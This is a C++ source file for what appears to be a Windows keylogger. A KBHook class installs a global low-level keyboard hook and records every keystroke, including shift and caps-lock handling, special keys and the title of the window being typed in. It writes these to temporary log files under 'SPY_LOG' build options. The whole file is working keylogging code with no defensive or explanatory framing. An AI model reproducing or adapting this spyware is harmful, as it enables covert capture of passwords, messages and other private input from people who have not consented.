#include "kbhook.h"
#include "kbhfile.h"

HHOOK KBHook::hook_handle = NULL;
KBHFile * KBHook::kbhfile = NULL;

LRESULT KBHook::hook_proc(int n_code, WPARAM w_param, LPARAM l_param)
{
	LOG("Has keyboard hook data code %d", n_code);
	if (n_code == HC_ACTION)
		process_hkdt(w_param, l_param);
	return CallNextHookEx(NULL, n_code, w_param, l_param);
}

VOID KBHook::process_hkdt(WPARAM w_param, LPARAM l_param)
{
#ifdef SPY_LOG_WINTEXT
	static HWND old_hwnd = NULL;// current window handle which typed on
	static char w_text[SPY_MAX_WTEXT_LTH];// buffer for saving window title
#endif
	static bool shift = false;// shift key state(down/up?)

	LOG("enter processing keyboard hook data...");
	const KBDLLHOOKSTRUCT * kbdt = (KBDLLHOOKSTRUCT *)l_param;

	if (kbdt->vkCode == VK_LSHIFT || kbdt->vkCode == VK_RSHIFT)
	{
		shift = (w_param == WM_KEYDOWN);
		LOG("shift is %s", shift ? "ON" : "OFF");
	}

	if (w_param == WM_SYSKEYDOWN || w_param == WM_KEYDOWN)
	{
		LOG("key has been pressed!");
		prepare_kbhfile();
#ifdef SPY_LOG_WINTEXT
		// save window text which typed on it
		// if a new file just has been created then write window text first
		const HWND new_hwnd = GetForegroundWindow();
		if (old_hwnd != new_hwnd || kbhfile->get_position() == 0)
		{
			const int ret = GetWindowTextA(new_hwnd, w_text, SPY_MAX_WTEXT_LTH);
			LOG("window text is '%s'", w_text);
			kbhfile->write("\n", 1);
			kbhfile->write(w_text, ret);
			kbhfile->write("\n", 1);
			old_hwnd = new_hwnd;
		}
#endif
		const bool caps = GetKeyState(VK_CAPITAL) < 0;// check caps lock pressed?
		LOG("caps is %s", caps ? "ON" : "OFF");
		LOG("write pressed key...");
		switch (kbdt->vkCode)
		{
			// number keys
#ifdef SPY_LOG_NUMBER
		case 0x30: kbhfile->write(shift ? ")" : "0", 1); break;
		case 0x31: kbhfile->write(shift ? "!" : "1", 1); break;
		case 0x32: kbhfile->write(shift ? "@" : "2", 1); break;
		case 0x33: kbhfile->write(shift ? "#" : "3", 1); break;
		case 0x34: kbhfile->write(shift ? "$" : "4", 1); break;
		case 0x35: kbhfile->write(shift ? "%" : "5", 1); break;
		case 0x36: kbhfile->write(shift ? "^" : "6", 1); break;
		case 0x37: kbhfile->write(shift ? "&" : "7", 1); break;
		case 0x38: kbhfile->write(shift ? "*" : "8", 1); break;
		case 0x39: kbhfile->write(shift ? "(" : "9", 1); break;
#else
		case 0x30:
		case 0x31:
		case 0x32:
		case 0x33:
		case 0x34:
		case 0x35:
		case 0x36:
		case 0x37:
		case 0x38:
		case 0x39: break;
#endif
			// numpad keys
#ifdef SPY_LOG_NUMPAD
		case 0x60: kbhfile->write("0", 1); break;
		case 0x61: kbhfile->write("1", 1); break;
		case 0x62: kbhfile->write("2", 1); break;
		case 0x63: kbhfile->write("3", 1); break;
		case 0x64: kbhfile->write("4", 1); break;
		case 0x65: kbhfile->write("5", 1); break;
		case 0x66: kbhfile->write("6", 1); break;
		case 0x67: kbhfile->write("7", 1); break;
		case 0x68: kbhfile->write("8", 1); break;
		case 0x69: kbhfile->write("9", 1); break;
#else
		case 0x60:
		case 0x61:
		case 0x62:
		case 0x63:
		case 0x64:
		case 0x65:
		case 0x66:
		case 0x67:
		case 0x68:
		case 0x69: break;
#endif
			// character keys
#ifdef SPY_LOG_CHARACTER
		case 0x41: kbhfile->write(caps ? (shift ? "a" : "A") : (shift ? "A" : "a"), 1); break;
		case 0x42: kbhfile->write(caps ? (shift ? "b" : "B") : (shift ? "B" : "b"), 1); break;
		case 0x43: kbhfile->write(caps ? (shift ? "c" : "C") : (shift ? "C" : "c"), 1); break;
		case 0x44: kbhfile->write(caps ? (shift ? "d" : "D") : (shift ? "D" : "d"), 1); break;
		case 0x45: kbhfile->write(caps ? (shift ? "e" : "E") : (shift ? "E" : "e"), 1); break;
		case 0x46: kbhfile->write(caps ? (shift ? "f" : "F") : (shift ? "F" : "f"), 1); break;
		case 0x47: kbhfile->write(caps ? (shift ? "g" : "G") : (shift ? "G" : "g"), 1); break;
		case 0x48: kbhfile->write(caps ? (shift ? "h" : "H") : (shift ? "H" : "h"), 1); break;
		case 0x49: kbhfile->write(caps ? (shift ? "i" : "I") : (shift ? "I" : "i"), 1); break;
		case 0x4A: kbhfile->write(caps ? (shift ? "j" : "J") : (shift ? "J" : "j"), 1); break;
		case 0x4B: kbhfile->write(caps ? (shift ? "k" : "K") : (shift ? "K" : "k"), 1); break;
		case 0x4C: kbhfile->write(caps ? (shift ? "l" : "L") : (shift ? "L" : "l"), 1); break;
		case 0x4D: kbhfile->write(caps ? (shift ? "m" : "M") : (shift ? "M" : "m"), 1); break;
		case 0x4E: kbhfile->write(caps ? (shift ? "n" : "N") : (shift ? "N" : "n"), 1); break;
		case 0x4F: kbhfile->write(caps ? (shift ? "o" : "O") : (shift ? "O" : "o"), 1); break;
		case 0x50: kbhfile->write(caps ? (shift ? "p" : "P") : (shift ? "P" : "p"), 1); break;
		case 0x51: kbhfile->write(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"), 1); break;
		case 0x52: kbhfile->write(caps ? (shift ? "r" : "R") : (shift ? "R" : "r"), 1); break;
		case 0x53: kbhfile->write(caps ? (shift ? "s" : "S") : (shift ? "S" : "s"), 1); break;
		case 0x54: kbhfile->write(caps ? (shift ? "t" : "T") : (shift ? "T" : "t"), 1); break;
		case 0x55: kbhfile->write(caps ? (shift ? "u" : "U") : (shift ? "U" : "u"), 1); break;
		case 0x56: kbhfile->write(caps ? (shift ? "v" : "V") : (shift ? "V" : "v"), 1); break;
		case 0x57: kbhfile->write(caps ? (shift ? "w" : "W") : (shift ? "W" : "w"), 1); break;
		case 0x58: kbhfile->write(caps ? (shift ? "x" : "X") : (shift ? "X" : "x"), 1); break;
		case 0x59: kbhfile->write(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"), 1); break;
		case 0x5A: kbhfile->write(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"), 1); break;
#else
		case 0x41:
		case 0x42:
		case 0x43:
		case 0x44:
		case 0x45:
		case 0x46:
		case 0x47:
		case 0x48:
		case 0x49:
		case 0x4A:
		case 0x4B:
		case 0x4C:
		case 0x4D:
		case 0x4E:
		case 0x4F:
		case 0x50:
		case 0x51:
		case 0x52:
		case 0x53:
		case 0x54:
		case 0x55:
		case 0x56:
		case 0x57:
		case 0x58:
		case 0x59:
		case 0x5A: break;
#endif
			// special keys
#ifdef SPY_LOG_SPECIAL
		case VK_SPACE:		kbhfile->write(" ", 1); break;
		case VK_RETURN:		kbhfile->write("\n", 1); break;
		case VK_TAB:		kbhfile->write("\t", 1); break;
		case VK_ESCAPE:		kbhfile->write("[ESC]", 5); break;
		case VK_LEFT:		kbhfile->write("[LEFT]", 6); break;
		case VK_RIGHT:		kbhfile->write("[RIGHT]", 7); break;
		case VK_UP:			kbhfile->write("[UP]", 4); break;
		case VK_DOWN:		kbhfile->write("[DOWN]", 6); break;
		case VK_END:		kbhfile->write("[END]", 5); break;
		case VK_HOME:		kbhfile->write("[HOME]", 6); break;
		case VK_DELETE:		kbhfile->write("[DEL]", 5); break;
		case VK_BACK:		kbhfile->write("[BACK]", 6); break;
		case VK_INSERT:		kbhfile->write("[INS]", 5); break;
		case VK_LCONTROL:
		case VK_RCONTROL:	kbhfile->write("[CTRL]", 6); break;
		case VK_LMENU:
		case VK_RMENU:		kbhfile->write("[ALT]", 5); break;
		case VK_F1:			kbhfile->write("[F1]", 4); break;
		case VK_F2:			kbhfile->write("[F2]", 4); break;
		case VK_F3:			kbhfile->write("[F3]", 4); break;
		case VK_F4:			kbhfile->write("[F4]", 4); break;
		case VK_F5:			kbhfile->write("[F5]", 4); break;
		case VK_F6:			kbhfile->write("[F6]", 4); break;
		case VK_F7:			kbhfile->write("[F7]", 4); break;
		case VK_F8:			kbhfile->write("[F8]", 4); break;
		case VK_F9:			kbhfile->write("[F9]", 4); break;
		case VK_F10:		kbhfile->write("[F10]", 5); break;
		case VK_F11:		kbhfile->write("[F11]", 5); break;
		case VK_F12:		kbhfile->write("[F12]", 5); break;
#else
		case VK_SPACE:
		case VK_RETURN:
		case VK_TAB:
		case VK_ESCAPE:
		case VK_LEFT:
		case VK_RIGHT:
		case VK_UP:
		case VK_DOWN:
		case VK_END:
		case VK_HOME:
		case VK_DELETE:
		case VK_BACK:
		case VK_INSERT:
		case VK_LCONTROL:
		case VK_RCONTROL:
		case VK_LMENU:
		case VK_RMENU:
		case VK_F1:
		case VK_F2:
		case VK_F3:
		case VK_F4:
		case VK_F5:
		case VK_F6:
		case VK_F7:
		case VK_F8:
		case VK_F9:
		case VK_F10:
		case VK_F11:
		case VK_F12: break;
#endif
			// symbol keys
#ifdef SPY_LOG_SYMBOL
		case VK_OEM_1: kbhfile->write(shift ? ":" : ";", 1); break;
		case VK_OEM_2: kbhfile->write(shift ? "?" : "/", 1); break;
		case VK_OEM_3: kbhfile->write(shift ? "~" : "`", 1); break;
		case VK_OEM_4: kbhfile->write(shift ? "{" : "[", 1); break;
		case VK_OEM_5: kbhfile->write(shift ? "|" : "\\", 1); break;
		case VK_OEM_6: kbhfile->write(shift ? "}" : "]", 1); break;
		case VK_OEM_7: kbhfile->write(shift ? "\"" : "'", 1); break;
		case VK_OEM_PLUS: kbhfile->write(shift ? "+" : "=", 1); break;
		case VK_OEM_COMMA: kbhfile->write(shift ? "<" : ",", 1); break;
		case VK_OEM_MINUS: kbhfile->write(shift ? +"_" : "-", 1); break;
		case VK_OEM_PERIOD: kbhfile->write(shift ? ">" : ".", 1); break;
#else
		case VK_OEM_1:
		case VK_OEM_2:
		case VK_OEM_3:
		case VK_OEM_4:
		case VK_OEM_5:
		case VK_OEM_6:
		case VK_OEM_7:
		case VK_OEM_PLUS:
		case VK_OEM_COMMA:
		case VK_OEM_MINUS:
		case VK_OEM_PERIOD: break;
#endif
			// unknown keys
#ifdef SPY_LOG_UNKNOWN
		default:
			DWORD _lparam = (kbdt->scanCode << 16) | (kbdt->flags << 24);
			char key[16];
			GetKeyNameTextA(_lparam, key, 15);
			LOG("write unknown key is '%s'", key);
			kbhfile->write(key, strlen(key));
			break;
#endif
		}
	}
	LOG("finish processing keyboard hook data!");
}

HHOOK KBHook::register_hook(HINSTANCE dll_instance)
{
	return SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hook_proc, dll_instance, 0);
}

VOID KBHook::unregister_hook()
{
	if (hook_handle != NULL)
	{
		UnhookWindowsHookEx(hook_handle);
		hook_handle = NULL;
	}
}

void KBHook::prepare_kbhfile()
{
	if (kbhfile->full())
	{
		delete kbhfile;
		gen_kbhfile();
	}
}

void KBHook::gen_kbhfile()
{
	char * file_path = new char[MAX_PATH];
	Spy::get_temp_fpath(file_path);
	kbhfile = new KBHFile(file_path);
	delete[] file_path;
}

DWORD KBHook::load(HINSTANCE dllinst)
{
	hook_handle = register_hook(dllinst);
	if (hook_handle == NULL)
	{
		LOG_E("Can not register hook: %s", strerror(errno));
		return errno;
	}
	else
	{
		gen_kbhfile();
		return 0;
	}
}

void KBHook::unload()
{
	unregister_hook();
	SAFE_FREE(kbhfile);
}